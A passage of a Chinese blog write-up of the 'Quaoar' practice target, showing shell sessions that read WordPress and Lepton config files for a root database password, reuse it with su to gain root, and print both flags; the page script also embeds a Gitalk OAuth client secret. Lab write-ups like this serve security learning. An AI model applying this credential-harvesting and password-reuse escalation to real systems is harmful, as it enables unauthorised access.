class="hljs-string">&#x27;3306&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;rootpassword!&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;Lepton&#x27;</span>);<br>define(<span class="hljs-string">&#x27;TABLE_PREFIX&#x27;</span>, <span class="hljs-string">&#x27;lep_&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>wordpress 目录也看看是不是一样的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/var/www$ <span class="hljs-built_in">cd</span> wordpress<br><span class="hljs-built_in">cd</span> wordpress<br>www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>index.php        wp-blog-header.php    wp-cron.php        wp-mail.php<br>license.txt      wp-comments-post.php  wp-includes        wp-settings.php<br>readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php<br>wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php<br>wp-admin         wp-content            wp-login.php       xmlrpc.php<br>www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configurations of the WordPress.<br> *<br> * This file has the following configurations: MySQL settings, Table Prefix,<br> * Secret Keys, WordPress Language, and ABSPATH. You can find more information<br> * by visiting &#123;@<span class="hljs-built_in">link</span> http://codex.wordpress.org/Editing_wp-config.php Editing<br> * wp-config.php&#125; Codex page. You can get the MySQL settings from your web host.<br> *<br> * This file is used by the wp-config.php creation script during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can just copy this file</span><br><span class="hljs-string"> * to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpress<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>rootpassword!<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define(&#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define(&#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don、&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define(<span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>/** */<br>define(<span class="hljs-string">&#x27;WP_HOME&#x27;</span>,<span class="hljs-string">&#x27;/wordpress/&#x27;</span>);<br>define(<span class="hljs-string">&#x27;WP_SITEURL&#x27;</span>,<span class="hljs-string">&#x27;/wordpress/&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>看一看有哪些用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">ls</span> -liah /home<br><span class="hljs-built_in">ls</span> -liah /home<br>total 12K<br>    22 drwxr-xr-x  3 root root 4.0K Oct 24  2016 .<br>     2 drwxr-xr-x 22 root root 4.0K Oct  7  2016 ..<br>406408 drwxr-xr-x  2 root root 4.0K Oct 22  2016 wpadmin<br>www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">cd</span> /home/wpadmin<br><span class="hljs-built_in">cd</span> /home/wpadmin<br>www-data@Quaoar:/home/wpadmin$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 12K<br>406408 drwxr-xr-x 2 root    root    4.0K Oct 22  2016 .<br>    22 drwxr-xr-x 3 root    root    4.0K Oct 24  2016 ..<br>406409 -rw-r--r-- 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt<br>www-data@Quaoar:/home/wpadmin$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>2bafe61f03117ac66a73c3c514de796e<br></code></pre></td></tr></table></figure>
+
+<h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>尝试用数据库密码切换一下登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/home/wpadmin$ su<br>su<br>Password: rootpassword!<br><br>root@Quaoar:/home/wpadmin<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@Quaoar:~<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 48K<br>    25 drwx------  6 root root 4.0K Nov 30  2016 .<br>     2 drwxr-xr-x 22 root root 4.0K Oct  7  2016 ..<br>  6833 drwx------  2 root root 4.0K Oct  7  2016 .aptitude<br> 11946 -rw-------  1 root root  368 Jan 15  2017 .bash_history<br>   500 -rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc<br> 11964 drwx------  2 root root 4.0K Oct 15  2016 .cache<br> 11962 ----------  1 root root   33 Oct 22  2016 flag.txt<br>   499 -rw-r--r--  1 root root  140 Apr 19  2012 .profile<br>406410 drwx------  2 root root 4.0K Oct 26  2016 .ssh<br> 18609 -rw-------  1 root root 4.7K Nov 30  2016 .viminfo<br>406624 drwxr-xr-x  8 root root 4.0K Jan 29  2015 vmware-tools-distrib<br>root@Quaoar:~<span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>8e3f9ec016e3598c5eec11fd3d73f6fb<br></code></pre></td></tr></table></figure>
+
+<p>比想象中的简单得多</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Quaoar 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/09/0986fb84a8d0.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/6ad0ced59f4a.html" title="Sedna 靶机">
+                        <span class="hidden-mobile">Sedna 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '97c539ef8671236843e998d1f592e283'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
